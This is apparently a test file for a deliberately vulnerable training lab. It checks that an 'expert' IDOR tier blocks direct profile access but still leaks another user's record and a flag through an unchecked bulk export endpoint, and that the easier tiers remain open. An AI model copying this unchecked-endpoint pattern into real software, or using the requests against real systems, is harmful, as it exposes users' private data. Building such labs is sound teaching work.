/**
 * tests/idor-expert-tier.test.js — Phase 7 addition: genuine Expert-tier
 * content for idor. Sixth lab with real Expert content.
 *
 * Unusual among the labs given Expert content so far: idor's easy/medium/
 * hard tiers never had ANY ownership check at all (only the id-encoding
 * scheme varied) — expert INTRODUCES a real check on the single-record
 * endpoint for the first time, then demonstrates the check doesn't
 * automatically cover a separate bulk/export endpoint. A real, common
 * class of bug (a fix applied to one code path, not to every path
 * capable of returning the same data).
 */
const http = require("http");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function get(urlPath, cookies) {
  return new Promise((resolve, reject) => {
    const options = cookies ? { headers: { Cookie: cookies } } : {};
    http.get(`http://localhost:3000${urlPath}`, options, (res) => {
      let body = "";
      res.on("data", (d) => (body += d));
      res.on("end", () => resolve({ status: res.statusCode, body, setCookies: res.headers["set-cookie"] || [] }));
    }).on("error", reject);
  });
}
function extractCookie(setCookies, name) {
  const line = setCookies.find((c) => c.startsWith(name + "="));
  return line ? line.split(";")[0] : null;
}

async function run() {
  const rInit = await get("/vuln/idor?difficulty=expert");
  check("the guard lets expert through for idor (6th lab enabled)", rInit.status === 200);
  const cookies = extractCookie(rInit.setCookies, "sid");
  const myIdMatch = rInit.body.match(/pill">([^<]*)</);
  const myId = myIdMatch ? myIdMatch[1] : null;
  check("my own encoded id is shown on the page", !!myId, rInit.body.slice(0, 300));

  // ensureUser() assigns a RANDOM real user (from a pool including ids
  // 1, 2, 3, 100) to each fresh session — so a hardcoded "victim id" can
  // randomly collide with the session's OWN id about 1 in 4 runs, which
  // would make "id=2" your own profile instead of someone else's. Pick a
  // victim id that's provably different from mine instead of assuming.
  const REAL_USER_IDS = [1, 2, 3, 100];
  const victimId = REAL_USER_IDS.find((id) => String(id) !== myId);
  check("a victim id distinct from my own was found among known real users", !!victimId, `myId=${myId}`);

  // --- expert introduces a REAL check on the single-record endpoint ------
  const rDirect = await get(`/vuln/idor/profile?id=${victimId}&difficulty=expert`, cookies);
  check("expert: direct access to a non-owned profile is now blocked", /Access denied/.test(rDirect.body));
  check("expert: the block issues no flag", !/FLAG\{/.test(rDirect.body));

  const rApiDirect = await get(`/api/viewUser?id=${victimId}&difficulty=expert`, cookies);
  const apiJson = JSON.parse(rApiDirect.body);
  check("expert: the underlying /api/viewUser endpoint is also checked, not just the page", rApiDirect.status === 403 && /own profile/i.test(apiJson.error), JSON.stringify(apiJson));

  // --- but the bulk export endpoint never got the same fix ---------------
  const rExportOwnOnly = await get(`/vuln/idor/export?ids=${myId}&difficulty=expert`, cookies);
  check("expert: exporting ONLY your own id leaks nothing (control case)", !/FLAG\{/.test(rExportOwnOnly.body));

  const rExportBatch = await get(`/vuln/idor/export?ids=${myId},${victimId}&difficulty=expert`, cookies);
  check("expert: exporting a batch including a non-owned id succeeds (the actual bug)", rExportBatch.status === 200);
  check("expert: the batch response includes the victim's leaked record", new RegExp(`"canonicalId":\\s*${victimId}\\b`).test(rExportBatch.body), rExportBatch.body.slice(0, 400));
  const flagMatch = rExportBatch.body.match(/FLAG\{idor-expert-[a-f0-9]+\}/);
  check("expert: a real, correctly-tiered flag is issued via the bulk export", !!flagMatch);

  // --- a fresh session isolates correctly (no cross-session leakage) -----
  const rOtherSession = await get(`/vuln/idor/export?ids=1,2,3&difficulty=expert`);
  check("a fresh session can still use the export endpoint independently (no shared/global state)", rOtherSession.status === 200);

  // --- confirm the other 3 tiers are completely unchanged -----------------
  const rEasyInit = await get("/vuln/idor?difficulty=easy");
  const easyCookies = extractCookie(rEasyInit.setCookies, "sid");
  const rEasy = await get("/vuln/idor/profile?id=1&difficulty=easy", easyCookies);
  check("easy tier: direct access still works with no check at all, exactly as before", /FLAG\{idor-easy-/.test(rEasy.body) || /\(That's your own profile/.test(rEasy.body));

  const rHardInit = await get("/vuln/idor?difficulty=hard");
  const hardCookies = extractCookie(rHardInit.setCookies, "sid");
  const b64 = Buffer.from("2").toString("base64");
  const rHard = await get(`/vuln/idor/profile?id=${encodeURIComponent(b64)}&difficulty=hard`, hardCookies);
  check("hard tier: base64-encoded direct access still works exactly as before (unchanged by expert's fix)", /FLAG\{idor-hard-/.test(rHard.body) || /\(That's your own profile/.test(rHard.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
